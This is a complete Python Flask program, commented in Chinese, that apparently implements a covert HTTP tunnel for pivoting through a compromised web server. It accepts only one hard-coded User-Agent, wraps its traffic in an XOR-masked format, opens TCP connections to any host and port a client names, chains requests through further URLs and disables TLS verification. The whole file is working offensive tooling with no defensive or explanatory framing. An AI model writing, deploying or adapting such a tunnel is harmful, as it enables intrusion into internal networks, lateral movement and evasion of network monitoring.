#!/usr/bin/env python3

from flask import Flask, request, Response, stream_with_context
import socket
import ssl
import threading
import random
import struct
import netifaces
import urllib.parse
import io
import requests
import os
from functools import wraps

app = Flask(__name__)

# 全局变量
addrs = {}
ctx = {}

def collect_addr():
    """收集本地网络接口地址"""
    local_addrs = {}
    for interface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(interface)
        for addr_family in [netifaces.AF_INET, netifaces.AF_INET6]:
            if addr_family in addrs:
                for addr in addrs[addr_family]:
                    ip = addr['addr']
                    # 处理IPv6地址中的%接口名
                    if '%' in ip:
                        ip = ip[:ip.index('%')]
                    local_addrs[ip] = True
    return local_addrs

# 初始化地址
addrs = collect_addr()

def u32_to_bytes(i):
    """将32位整数转换为字节数组"""
    return struct.pack("!I", i)

def bytes_to_u32(bytes_data):
    """将字节数组转换为32位整数"""
    return struct.unpack("!I", bytes_data)[0]

def marshal(data_map):
    """序列化数据"""
    buf = bytearray()
    for key, value in data_map.items():
        key_bytes = key.encode()
        buf.append(len(key_bytes))
        buf.extend(key_bytes)
        buf.extend(u32_to_bytes(len(value)))
        buf.extend(value)
    
    data = bytes(buf)
    # XOR加密
    key = random.randint(1, 255)
    encrypted_data = bytes([b ^ key for b in data])
    
    # 构建完整数据包
    result = bytearray()
    result.extend(u32_to_bytes(len(encrypted_data)))
    result.append(key)
    result.extend(encrypted_data)
    
    return bytes(result)

def unmarshal(input_stream):
    """反序列化数据"""
    # 读取头部(长度+密钥)
    header = input_stream.read(5)
    if len(header) < 5:
        raise Exception("Invalid header")
    
    data_len = bytes_to_u32(header[:4])
    xor_key = header[4]
    
    if data_len > 32 * 1024 * 1024:  # 32MB限制
        raise Exception("Invalid data length")
    
    # 读取并解密数据
    encrypted_data = input_stream.read(data_len)
    if len(encrypted_data) != data_len:
        raise Exception("Incomplete data")
    
    data = bytes([b ^ xor_key for b in encrypted_data])
    
    # 解析键值对
    result = {}
    i = 0
    while i < len(data):
        if i + 1 > len(data):
            break
        
        key_len = data[i]
        i += 1
        
        if key_len < 0 or i + key_len > len(data):
            raise Exception("Invalid key length")
        
        key = data[i:i+key_len].decode()
        i += key_len
        
        if i + 4 > len(data):
            raise Exception("Invalid value length")
        
        value_len = bytes_to_u32(data[i:i+4])
        i += 4
        
        if value_len < 0 or i + value_len > len(data):
            raise Exception("Invalid value")
        
        value = data[i:i+value_len]
        i += value_len
        
        result[key] = value
    
    return result

def new_status(status_code):
    """创建状态响应"""
    return {"s": bytes([status_code])}

def new_data(data):
    """创建数据响应"""
    return {"ac": bytes([0x01]), "dt": data}

def new_del():
    """创建删除响应"""
    return {"ac": bytes([0x02])}

def is_local_addr(url):
    """检查URL是否指向本地地址"""
    hostname = urllib.parse.urlparse(url).hostname
    return hostname in addrs

def read_full(input_stream, size):
    """完整读取指定大小的数据"""
    buffer = bytearray(size)
    bytes_read = 0
    while bytes_read < size:
        chunk = input_stream.read(size - bytes_read)
        if not chunk:
            break
        buffer[bytes_read:bytes_read+len(chunk)] = chunk
        bytes_read += len(chunk)
    return bytes(buffer[:bytes_read])

def read_socket(input_stream, output_stream, need_marshal=False):
    """从socket读取数据并写入输出流"""
    buffer_size = 8 * 1024
    while True:
        data = input_stream.read(buffer_size)
        if not data:
            break
        
        if need_marshal:
            data = marshal(new_data(data))
        
        output_stream.write(data)
        output_stream.flush()

class SocketReader(threading.Thread):
    """Socket读取线程"""
    def __init__(self, input_stream, output_stream):
        super().__init__()
        self.input_stream = input_stream
        self.output_stream = output_stream
    
    def run(self):
        try:
            read_socket(self.input_stream, self.output_stream, True)
        except Exception as e:
            pass

def verify_agent():
    """验证User-Agent"""
    return request.headers.get('User-Agent') == "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3"

def try_full_duplex():
    """测试全双工通信"""
    input_stream = request.stream
    data = read_full(input_stream, 32)
    
    return Response(data, mimetype='application/octet-stream')

def process_data_bio():
    """处理双向数据流"""
    input_stream = request.stream
    data_map = unmarshal(input_stream)
    
    action = data_map.get("ac")
    if not action or len(action) != 1 or action[0] != 0x00:
        return Response(status=403)
    
    response = Response(mimetype='application/octet-stream')
    response.headers['X-Accel-Buffering'] = 'no'
    
    try:
        host = data_map.get("h").decode()
        port_str = data_map.get("p").decode()
        port = int(port_str) if port_str != "0" else request.environ.get('SERVER_PORT')
        
        # 创建socket连接
        sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sc.settimeout(5)
        sc.connect((host, port))
        
        def generate():
            # 发送成功状态
            yield marshal(new_status(0x00))
            
            # 启动读取socket的线程
            reader = SocketReader(sc.makefile('rb'), io.BytesIO())
            reader.start()
            
            try:
                # 读取请求并写入socket
                while True:
                    data_map = unmarshal(input_stream)
                    action = data_map.get("ac")
                    if not action or len(action) != 1:
                        break
                    
                    if action[0] == 0x02:  # 删除操作
                        break
                    elif action[0] == 0x01:  # 数据操作
                        data = data_map.get("dt", b'')
                        if data:
                            sc.sendall(data)
                    elif action[0] == 0x03:  # 心跳
                        continue
                    else:
                        break
            except Exception as e:
                pass
            finally:
                sc.close()
                reader.join()
        
        return Response(stream_with_context(generate()), mimetype='application/octet-stream')
    
    except Exception as e:
        return Response(marshal(new_status(0x01)), mimetype='application/octet-stream')

def process_data_unary():
    """处理单向数据流"""
    input_stream = request.stream
    data_map = unmarshal(input_stream)
    
    client_id = data_map.get("id", b'').decode()
    actions = data_map.get("ac")
    if not actions or len(actions) != 1:
        return Response(status=403)
    
    action = actions[0]
    
    # 检查是否需要重定向
    redirect_data = data_map.get("r")
    need_redirect = redirect_data and len(redirect_data) > 0
    redirect_url = ""
    
    if need_redirect:
        redirect_url = redirect_data.decode()
        del data_map["r"]
        need_redirect = not is_local_addr(redirect_url)
    
    # 处理重定向请求(对于非创建socket的操作)
    if need_redirect and 0x01 <= action <= 0x03:
        redirect_request(request, data_map, redirect_url)
        return Response("", status=200)
    
    # 处理删除操作
    if action == 0x02:
        socket_out = ctx.get(client_id)
        if socket_out:
            socket_out.close()
        return Response("", status=200)
    
    # 处理数据操作
    elif action == 0x01:
        socket_out = ctx.get(client_id)
        if not socket_out:
            return Response(marshal(new_del()), mimetype='application/octet-stream')
        
        data = data_map.get("dt", b'')
        if data:
            socket_out.sendall(data)
        return Response("", status=200)
    
    # 处理创建操作
    elif action == 0x00:
        response = Response(mimetype='application/octet-stream')
        response.headers['X-Accel-Buffering'] = 'no'
        
        host = data_map.get("h").decode()
        port_str = data_map.get("p").decode()
        port = int(port_str) if port_str != "0" else request.environ.get('SERVER_PORT')
        
        if need_redirect:
            # 重定向到远程URL
            resp = redirect_request(request, data_map, redirect_url)
            
            def generate():
                for chunk in resp.iter_content(8192):
                    yield chunk
            
            return Response(stream_with_context(generate()), mimetype='application/octet-stream')
        else:
            # 创建socket连接
            try:
                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sc.settimeout(5)
                sc.connect((host, port))
                ctx[client_id] = sc
                
                def generate():
                    yield marshal(new_status(0x00))
                    
                    try:
                        while True:
                            data = sc.recv(8192)
                            if not data:
                                break
                            yield marshal(new_data(data))
                    except Exception as e:
                        pass
                    finally:
                        sc.close()
                        if client_id in ctx:
                            del ctx[client_id]
                
                return Response(stream_with_context(generate()), mimetype='application/octet-stream')
            except Exception as e:
                if client_id in ctx:
                    del ctx[client_id]
                return Response(marshal(new_status(0x01)), mimetype='application/octet-stream')
    
    return Response("", status=200)

def redirect_request(orig_request, data_map, redirect_url):
    """重定向请求到指定URL"""
    method = orig_request.method
    headers = dict(orig_request.headers)
    
    # 调整headers
    headers['Content-Length'] = str(len(marshal(data_map)))
    headers['Host'] = urllib.parse.urlparse(redirect_url).netloc
    headers['Connection'] = 'close'
    
    # 删除特定headers
    for header in ['Content-Encoding', 'Transfer-Encoding']:
        if header in headers:
            del headers[header]
    
    # 创建请求
    session = requests.Session()
    session.verify = False
    
    response = session.request(
        method=method,
        url=redirect_url,
        headers=headers,
        data=marshal(data_map),
        stream=True
    )
    
    return response

@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'])
def handle_request():
    """主处理函数"""
    # 验证User-Agent
    if not verify_agent():
        return Response("Unauthorized", status=403)
    
    content_type = request.headers.get('Content-Type')
    if not content_type:
        return Response("", status=200)
    
    try:
        if content_type == 'application/plain':
            return try_full_duplex()
        elif content_type == 'application/octet-stream':
            return process_data_bio()
        else:
            return process_data_unary()
    except Exception as e:
        return Response("", status=500)

if __name__ == '__main__':
    # 禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # 需要安装的依赖: flask, requests, netifaces
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)